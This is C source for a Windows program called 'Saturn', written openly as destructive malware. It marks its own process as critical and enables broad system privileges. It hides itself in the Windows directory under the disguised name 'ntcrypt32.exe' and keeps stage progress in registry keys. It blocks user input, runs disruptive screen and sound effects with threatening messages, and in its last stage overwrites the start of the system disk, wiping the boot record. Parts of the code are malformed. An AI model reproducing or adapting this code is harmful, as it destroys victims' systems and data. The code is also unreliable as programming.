#include "Saturn.h"

INT
SATURN
WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdline,
	_In_ INT nShowCmd
) {
	DOUBLE SATURN GetWinVer(); {
		DOUBLE winver = 0.0;
		NTSTATUS(SATURN *RtlGetVersion)(LPOSVERSIONINFOEXW);
		OSVERSIONINFOEXW osInfo;
		*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

		if (NULL != RtlGetVersion) {
			osInfo.dwOSVersionInfoSize = sizeof(osInfo);
			RtlGetVersion(&osInfo);
			winver = (DOUBLE)osInfo.dwMajorVersion;
		}
		if (winver != 10) {
			MessageBoxA(NULL, "Saturn.exe Is Unsupported In Versions Other Than NT 10 (Windows 10).\r\nMake Sure Your Running NT 10 (Windows 10) Before Running Saturn.exe.", "Saturn.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
			ExitProcess(winver);
		}
	}
	static const DWORD savevalue = 0x00000001;
	static const LPCTSTR saturnregkeypath = TEXT("SOFTWARE\\Microsoft\\Windows NT\\Saturn");
	static const LPCTSTR saturncomerasekey = TEXT("SOFTWARE\\Microsoft\\Windows NT\\Saturn\\comerase");
	HKEY shKey;
	HKEY savehKey;
	DWORD value = 0;
	static DWORD cbSize = sizeof(DWORD);
	DWORD SATURN SetProcessCritical(); {
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");

		if (RtlAdjustPrivilege != NULL && RtlSetProcessIsCritical != NULL) {
			BOOLEAN tmp1;
			RtlAdjustPrivilege(20, TRUE, FALSE, &tmp1);
			RtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}
	DWORD SATURN SetTokenPrivilages(); {
		HANDLE token;
		TOKEN_PRIVILEGES privileges;

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privileges.Privileges[1].Luid);
		LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &privileges.Privileges[2].Luid);
		LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &privileges.Privileges[3].Luid);
		LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &privileges.Privileges[4].Luid);
		LookupPrivilegeValue(NULL, SE_SYSTEMTIME_NAME, &privileges.Privileges[5].Luid);
		LookupPrivilegeValue(NULL, SE_TCB_NAME, &privileges.Privileges[6].Luid);
		LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &privileges.Privileges[7].Luid);
		LookupPrivilegeValue(NULL, SE_CHANGE_NOTIFY_NAME, &privileges.Privileges[8].Luid);
		LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &privileges.Privileges[9].Luid);
		LookupPrivilegeValue(NULL, SE_MANAGE_VOLUME_NAME, &privileges.Privileges[10].Luid);
		LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &privileges.Privileges[11].Luid);
		LookupPrivilegeValue(NULL, SE_MACHINE_ACCOUNT_NAME, &privileges.Privileges[12].Luid);



		privileges.PrivilegeCount = 13;
		privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[5].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[6].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[7].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[8].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[9].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[10].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[11].Attributes = SE_PRIVILEGE_ENABLED;
		privileges.Privileges[12].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	}
	INT SATURN SaturnFirstRunSet(); {
		INT SATURN CheckProgress(); {
			//	RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fhKey, NULL);
			//	RegCloseKey(fhKey);
			LONG lregopenresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &shKey);
			if (lregopenresult != ERROR_SUCCESS) {
				if (lregopenresult == ERROR_FILE_NOT_FOUND) {
					HKEY fHkey;
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fHkey, NULL);
					RegCloseKey(fHkey);
					fHkey = (HKEY)NULL;
				}
			}
			RegQueryValueEx(shKey, "SaturnFirstRunComplete", 0, NULL, (LPBYTE)&value, &cbSize);
			if (value == 1) {
				shKey = (HKEY)NULL;
				value = (DWORD)NULL;
				RegCloseKey(shKey);
				goto SaturnSet2Label;
			}
			RegCloseKey(shKey);
			shKey = (HKEY)NULL;
			value = (DWORD)NULL;
		}
		DWORD SATURN MoveSaturn(); {
			LPSTR SaturnPath = (LPSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH);
			LPSTR CryptWindowsDirectory = (LPSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH);
			char satname[13] = "\\Saturn.exe";
			char cryptname[16] = "\\ntcrypt32.exe";

			GetCurrentDirectory(MAX_PATH, SaturnPath);
			//GetModuleFileName(NULL, &SaturnPath, sizeof(SaturnPath));
			StringCchCat(SaturnPath, STRSAFE_MAX_CCH, satname);
			GetWindowsDirectory(CryptWindowsDirectory, MAX_PATH);
			StringCchCat(CryptWindowsDirectory, STRSAFE_MAX_CCH, cryptname);
			MoveFile(SaturnPath, CryptWindowsDirectory);
		}
		DWORD SATURN MakeSaturnSystemFile(); {
			LPSTR CryptWindowsDirectory2 = (LPSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH);
			char cryptname2[16] = "\\ntcrypt32.exe";
			GetWindowsDirectory(CryptWindowsDirectory2, MAX_PATH);
			StringCchCat(CryptWindowsDirectory2, STRSAFE_MAX_CCH, cryptname2);
			SetFileAttributes(CryptWindowsDirectory2, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
		}
		DWORD SATURN SaturnSaveProgress(); {
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &savehKey);
			RegSetValueEx(savehKey, "SaturnFirstRunComplete", 0, REG_DWORD, (LPBYTE)&savevalue, sizeof(savevalue));
			RegCloseKey(savehKey);
			savehKey = (HKEY)NULL;
		}
	}
SaturnSet2Label:;
	DWORD SATURN JanuarySet(); {
		INT CheckProgress2(); {
			LONG lregopenresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &shKey);
			if (lregopenresult != ERROR_SUCCESS) {
				if (lregopenresult == ERROR_FILE_NOT_FOUND) {
					HKEY fHkey;
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fHkey, NULL);
					RegCloseKey(fHkey);
					fHkey = (HKEY)NULL;
				}
			}
			LONG lregqueryresult = RegQueryValueEx(shKey, "SaturnSet2Complete", 0, NULL, (LPBYTE)&value, &cbSize);
			if (value == 1 && lregqueryresult == ERROR_SUCCESS) {
				shKey = (HKEY)NULL;
				value = (DWORD)NULL;
				RegCloseKey(shKey);
				goto SaturnSet3Label;
			}
			RegCloseKey(shKey);
			shKey = (HKEY)NULL;
			value = (DWORD)NULL;
		}
		for (INT z = 0; z < 5; z++) { // 'Z' Should Be Less Than 15.
			HTHREAD SaturnFlashWindow = CreateThread(NULL, 65536, &SaturnFlashWindows, NULL, NULL, NULL);
			HTHREAD SaturnJanuaryGDI = CreateThread(NULL, 65536, &JanuaryGDI, NULL, NULL, NULL);
			WaitForSingleObject(SaturnFlashWindows, random() % 30000);
			WaitForSingleObject(SaturnJanuaryGDI, random() % 30000);
			TerminateThread(SaturnFlashWindows, 0);
			TerminateThread(SaturnJanuaryGDI, 0);
			BlockInput(TRUE);
			Beep(1000, random() % 15000);
			BlockInput(FALSE);
			Sleep(250);
		}

		MessageBox(NULL, "YOU STEPPED A FOOT TO THE PUNISHMENT GIVEN TO PEOPLE WHO KILL CATS, BUT DID NOT EXPECT AN IDIOT LIKE YOU TO RECIEVE THIS SPECIAL PUNISHMENT. THIS IS THE BEGINNING OF AN EXPERIENCE YOU HAVE NEVER EXPERIENCED. GOOD LUCK.", "", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_OK);
		BlockInput(TRUE);
		Beep(1000, random() % 15000);
		BlockInput(FALSE);
		ExitProcess(0);
	}
SaturnSet3Label:;
	DWORD SATURN OctoberSet(); {
		INT CheckProgress3(); {
			LONG lregopenresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &shKey);
			if (lregopenresult != ERROR_SUCCESS) {
				if (lregopenresult == ERROR_FILE_NOT_FOUND) {
					HKEY fHkey;
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fHkey, NULL);
					RegCloseKey(fHkey);
					fHkey = (HKEY)NULL;
				}
			}
			LONG lregqueryresult = RegQueryValueEx(shKey, "SaturnSet3Complete", 0, NULL, (LPBYTE)&value, &cbSize);
			if (value == 1 && lregqueryresult == ERROR_SUCCESS) {
				shKey = (HKEY)NULL;
				value = (DWORD)NULL;
				RegCloseKey(shKey);
				goto SaturnSet4Label;
			}
			RegCloseKey(shKey);
			shKey = (HKEY)NULL;
			value = (DWORD)NULL;
		}
		HTHREAD MoveIconGDIThread = CreateThread(NULL, 65536, &MoveIconsGDI, NULL, NULL, NULL);
		WaitForSingleObject(MoveIconGDIThread, random() % 300000);

		MessageBox(NULL, "NOW, IT MIGHT BE CLEAR, YOU MESSED WITH THE WRONG THING. ABSOLUTELY NO ONE WILL BE ABLE TO SAVE YOUR COMPUTER. AND THE BEST PART, IT IS ONLY THE BEGINNING, OF THE END.", "", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_OK);
		BlockInput(TRUE);
		Beep(1000, random() % 15000);
		BlockInput(FALSE);
		ExitProcess(0);
	}
SaturnSet4Label:;
	DWORD SATURN MarchSet(); {
		INT CheckProgress4(); {
			LONG lregopenresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &shKey);
			if (lregopenresult != ERROR_SUCCESS) {
				if (lregopenresult == ERROR_FILE_NOT_FOUND) {
					HKEY fHkey;
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fHkey, NULL);
					RegCloseKey(fHkey);
					fHkey = (HKEY)NULL;
				}
			}
			LONG lregqueryresult = RegQueryValueEx(shKey, "SaturnSet4Complete", 0, NULL, (LPBYTE)&value, &cbSize);
			if (value == 1 && lregqueryresult == ERROR_SUCCESS) {
				shKey = (HKEY)NULL;
				value = (DWORD)NULL;
				RegCloseKey(shKey);
				goto SaturnSet5Label;
			}
			RegCloseKey(shKey);
			shKey = (HKEY)NULL;
			value = (DWORD)NULL;
		}
		HTHREAD Erode = CreateThread(NULL, 65536, &MarchGDI, NULL, NULL, NULL);
		WaitForSingleObject(Erode, random() % INFINITE);
		MessageBox(NULL, "NOTHING WILL SAVE YOU AT THIS POINT, YOU MESSED UP BADLY, YOU CAN'T DO ANYTHING. THE NEXT TIME YOU THINK TO DO THE SAME, IS IT WORTH IT? YOUR ANSWER TO YOUR QUESTION WILL MAKE THE OUTCOME GOOD / BAD. THE NEXT ONE IS GOING TO MAKE IT CLEAR, IT IS NOT WORTH ANYTHING TO KILL A CAT, AND WILLINGLY THAT IS. AS ALWAYS GOOD LUCK. TRY TO SURVIVE YOUNG MAN.", "", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_OK);
		BlockInput(TRUE);
		Beep(1000, random() % 15000);
		BlockInput(FALSE);
		ExitProcess(0);
	}
SaturnSet5Label:;
	DWORD SATURN AugustSet(); {
		INT CheckProgress4(); {
			LONG lregopenresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, KEY_ALL_ACCESS, &shKey);
			if (lregopenresult != ERROR_SUCCESS) {
				if (lregopenresult == ERROR_FILE_NOT_FOUND) {
					HKEY fHkey;
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, saturnregkeypath, 0, (LPTSTR)NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &fHkey, NULL);
					RegCloseKey(fHkey);
					fHkey = (HKEY)NULL;
				}
			}
			LONG lregqueryresult = RegQueryValueEx(shKey, "SaturnSet5Complete", 0, NULL, (LPBYTE)&value, &cbSize);
			if (value == 1 && lregqueryresult == ERROR_SUCCESS) {
				shKey = (HKEY)NULL;
				value = (DWORD)NULL;
				RegCloseKey(shKey);
				goto SaturnSet6Label;
			}
			RegCloseKey(shKey);
			shKey = (HKEY)NULL;
			value = (DWORD)NULL;
		}
		HTHREAD SaturnTimeCurse = CreateThread(NULL, 65536, &SaturnTimeCurse, NULL, NULL, NULL);
		HTHREAD SaturnReverseWindowsText = CreateThread(NULL, 65536, &SaturnReverseWindowText, NULL, NULL, NULL);
		//HTHREAD SaturnRandomSearches = CreateThread(NULL, 65536, &SaturnRandomSearches, NULL, NULL, NULL);
		//HTHREAD SaturnRandomApplicationExecution = CreateThread(NULL, 65536, &SaturnRandomApplicationStart, NULL, NULL, NULL);
		HTHREAD SaturnErrorSounds = CreateThread(NULL, 65536, &SaturnPlayErrorSounds, NULL, NULL, NULL);
		HTHREAD CatGDI = CreateThread(NULL, 65536, &SCatGDI, NULL, NULL, NULL);
		WaitForSingleObject(SaturnTimeCurse, random() % 50000);
		WaitForSingleObject(SaturnReverseWindowText, random() % 50000);
		WaitForSingleObject(SaturnRandomSearches, random() % 50000);
		WaitForSingleObject(SaturnRandomApplicationStart, random() % 50000);
		WaitForSingleObject(SaturnErrorSounds, random() % 50000);
		WaitForSingleObject(CatGDI, random() % 50000);

		if (MessageBox(NULL, "YOU THOUGHT YOU CAN GET AWAY FROM KILLING SONI, HAHA YOU ARE VERY WRONG. YOUR COMPUTER IS DOOMED. ANSWER THE QUESTION CAREFULLY. TAKE AS LONG AS YOU WANT, BUT YOU HAVE TO ANSWER THIS. WILL YOU KILL ANOTHER CAT OTHER THAN SONI?", "", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_YESNO) == IDYES) SonicDeath();
		else SonicRestart();
		BlockInput(TRUE);
		Beep(1000, random() % 15000);
		BlockInput(FALSE);
		ExitProcess(0);
	}
SaturnSet6Label:;
	DWORD SATURN SeptemberSet(); {
		HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		DWORD dwBytesWritten = 0;
		HEX scode = (HEX)LocalAlloc(LMEM_ZEROINIT, 2000000);
		ZeroMemory(&scode, sizeof(scode));
		WriteFile(mbr, scode, 2000000, &dwBytesWritten, (LPOVERLAPPED)NULL);

		if (MessageBox(NULL, "NOTHING WILL SAVE YOU NOW, AND NEVER, THERE IS NO ESCAPE.\r\n\r\nDO NOT TRY TO CLOSE THIS WINDOW, EVEN IF YOU DO, NOTHING IS GOING TO CHANGE, OTHER THAN SOME OTHER HEADACHES THAT WILL BE CREATED.\r\n\r\nTHIS IS WHAT YOU DESERVE.\r\n\r\nYOUR COMPUTER IS NOW DONE FOR ANYWAY,\r\n\r\nDO YOU WANT TO ENJOY THE LAST MINUTES USING YOUR COMPUTER?", "", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_YESNO) == IDYES) SlowDeath();
		else InstantDeath();
	}
}





/*
// Autotype. *This Is Using Experimental Autotype Code.* Message:
		LPARAM januarymessage[240] = { "YOU STEPPED A FOOT TO THE PUNISHMENT GIVEN TO PEOPLE WHO KILL CATS,\r\n\r\nBUT DID NOT EXPECT AN IDIOT LIKE YOU TO RECIEVE THIS SPECIAL PUNISHMENT.\r\n\r\nTHIS IS THE BEGINNING OF AN EXPERIENCE YOU HAVE NEVER EXPERIENCED.\r\n\r\nGOOD LUCK." };
		LPARAM januarychr = 0;
		ShellExecute(0, "open", "notepad", 0, 0, SW_SHOWNORMAL);
		Sleep(500);
		HWND parhWnd = FindWindow("Notepad", NULL);
		HWND chihWnd = FindWindow("Edit", NULL);
		HWND hWnd = FindWindowEx(parhWnd, chihWnd, "Edit", NULL);
		HFONT hFont = CreateFont(30, 14, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_MODERN, "Saturn Rise");
		//BlockInput(TRUE);
		for (INT j = 0; januarymessage[240]; j++) {
			if (j == 67) {
				januarychr = januarymessage[j + 8];
				j = 68 + 8;
				goto jline;
			}
			else if (j == 139) {
				januarychr = januarymessage[j + 8];
				j = 140 + 8;
				goto jline;
			}
			else if (j == 205) {
				januarychr = januarymessage[j + 8];
				j = 206 + 8;
				goto jline;
			}
			else {
				januarychr = januarymessage[j];
			}
		jline:
			Sleep(500);
			SendMessage(hWnd, WM_SETTEXT, (WPARAM)0, (LPARAM)januarychr);
		}
*/